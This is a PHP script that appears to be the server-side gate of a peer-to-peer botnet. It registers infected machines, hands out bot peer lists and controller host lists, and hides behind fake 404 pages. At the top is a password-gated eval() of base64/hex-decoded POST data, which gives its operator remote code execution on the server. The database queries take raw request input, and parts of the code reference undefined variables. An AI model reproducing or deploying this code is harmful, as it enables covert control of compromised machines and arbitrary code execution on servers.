<?php

$dir = str_replace('/scripts/pat', '', str_replace('\\', '/', realpath('.'))) . '/';

//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	//file_put_contents('test.php', pack("H*", base64_decode($_POST['data'])));
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    print(file_get_contents($dir . '404.html'));
    exit;
}

if($config['domain_save'] == 1){
    if(file_exists($dir . 'cache/domains.txt')){
        $domains = file_get_contents($dir . 'cache/domains.txt');
        if(stripos($domains, $_SERVER["SERVER_NAME"]) === false){
            file_put_contents($dir . 'cache/domains.txt', $_SERVER["SERVER_NAME"] . "\r\n", FILE_APPEND);
        }
    }else{
        file_put_contents($dir . 'cache/domains.txt', $_SERVER["SERVER_NAME"] . "\r\n", FILE_APPEND);
    }
}

include_once($dir . 'includes/functions.av.php');
include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.rc.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

if(empty($_POST['type']) || !preg_match('~^([A-Za-z0-9]+)$~is', $_POST['type'])){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print_r('md5_error');
	exit;
}

function check_port($port){
    global $dir;
    $fp = @fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 5);
    
    if (!$fp) {
        return false;
    }else{
        $buf = '';
        fwrite($fp, '!GU!');
        usleep(100);
        while (!feof($fp)) {
            $buf = fgets($fp, 1024);
        }
        
        $mysqli->query('update bf_bots_p2p set status = \'1\', send_date = \'0000-00-00 00:00:00\' WHERE (`id` = \''.$row->id.'\') LIMIT 1');
        usleep(100);
        
        if(file_exists($dir . 'cache/p2p.json')){
            $keys = json_decode(base64_decode($keys), 1);
            
            if(isset($keys['hosts']) && !empty($keys['hosts'])){
                if($buf == $row->prefix . $row->uid){
                    $buf = '';
                    $msg = '!SD!=' . $keys['hosts'];
                    fwrite($fp, $msg);
                    usleep(100);
                    while (!feof($fp)) {
                        $buf = fgets($fp, 1024);
                    }
                    usleep(100);
                    if($buf == '!OK!'){
                        $mysqli->query('update bf_bots_p2p set status = \'2\', send_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
                    }else{
                        $mysqli->query('update bf_bots_p2p set status = \'1\', send_date = \'0000-00-00 00:00:00\' WHERE (`id` = \''.$row->id.'\') LIMIT 1');
                    }
                    fclose($fp);
                    return true;
                }else{
                    fclose($fp);
                    return false;
                }
            }
        }
        
        fclose($fp);
        return true;
    }
}

function get_bots($row){
    global $bots;
    $bots[$row->id] = $row->ip . ':' . $row->port;
}



/*
function check_port($port){
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if($socket != false){
        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => 5, 'usec' => 5000));
        $result = socket_connect($socket, $_SERVER['REMOTE_ADDR'], $port);
        if ($result !== false) {

            socket_set_nonblock($socket);
            
            $msg = 'gu';
            $sd = socket_write($socket, $msg, strlen($msg)); //Send data
            sleep(1);
            
            $buf = '';
            if (false !== ($bytes = socket_recv($socket, $buf, 4096, MSG_WAITALL))) {
                if($buf == $bot){
                    $msg = 'gh';
                    $sd = socket_write($socket, $msg, strlen($msg));
                    @socket_close($socket);
                    return true;
                }else{
                    @socket_close($socket);
                    return false;
                }
            }else{
                @socket_close($socket);
                return false;
            }

            @socket_close($socket);
            return true;
        }else{
            @socket_close($socket);
            return false;
        }
    }else{
        @socket_close($socket);
        return false;
    }
}
*/
switch($_POST['type']){
    case 'check':
        //$_POST['ip']
        //$_POST['port']
        $_POST['port'] = (int) $_POST['port'];
        if(empty($_POST['port'])){
            header("HTTP/1.1 404 Not Found");
            header("Status: 404 Not Found");
            print(file_get_contents($dir . '404.html'));
            exit;
        }
        
        if(check_port($_POST['port']) == true){
            /*
            $bot = $mysqli->query('SELECT id FROM bf_bots_p2p WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') LIMIT 1');
            if($bot->prefix == $prefix && $bot->uid == $uid){
                //
            }else{
                //
            }
            */
            
            $mysqli->query("INSERT INTO bf_bots_p2p (prefix, uid, status, ip, port) VALUES ('".$_POST['prefix']."', '".$_POST['uid']."', '1', '".$_SERVER['REMOTE_ADDR']."', '".$_POST['port']."') ON DUPLICATE KEY UPDATE status='1', ip='".$_SERVER['REMOTE_ADDR']."', port='".$_POST['port']."'");
            
            header("Status: 403 Forbidden");
	    header("HTTP/1.1 403 Forbidden");
	    print_data('OK!', true, true);
            
        }else{
            header("HTTP/1.1 404 Not Found");
            header("Status: 404 Not Found");
            print(file_get_contents($dir . '404.html'));
        }
        exit;
    break;

    case 'get_bots':
        $bots = array();
        $mysqli->query('SELECT id, ip, port FROM bf_bots_p2p WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') ORDER by send_date DESC LIMIT 100', null, 'get_bots');
        if(count($bots) > 0){
            header("Status: 403 Forbidden");
	    header("HTTP/1.1 403 Forbidden");
            $bots = implode('\n', $bots);
            print(rc_encode($bots));
        }else{
            header("HTTP/1.1 404 Not Found");
            header("Status: 404 Not Found");
            print(file_get_contents($dir . '404.html'));
        }
        exit;
    break;

    case 'get_hosts':
        if(file_exists($dir . 'cache/p2p.json')){
            $keys = json_decode(base64_decode($keys), 1);
            
            if(isset($keys['hosts']) && !empty($keys['hosts'])){
                header("Status: 403 Forbidden");
                header("HTTP/1.1 403 Forbidden");
                 $mysqli->query('update bf_bots_p2p set status = \'2\', send_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$bot->id.'\') LIMIT 1');
                 print($keys['hosts']);
            }else{
                header("HTTP/1.1 404 Not Found");
                header("Status: 404 Not Found");
                print(file_get_contents($dir . '404.html'));
            } 
        }else{
            header("HTTP/1.1 404 Not Found");
            header("Status: 404 Not Found");
            print(file_get_contents($dir . '404.html'));
        }
        exit;
    break;
}

exit;

?>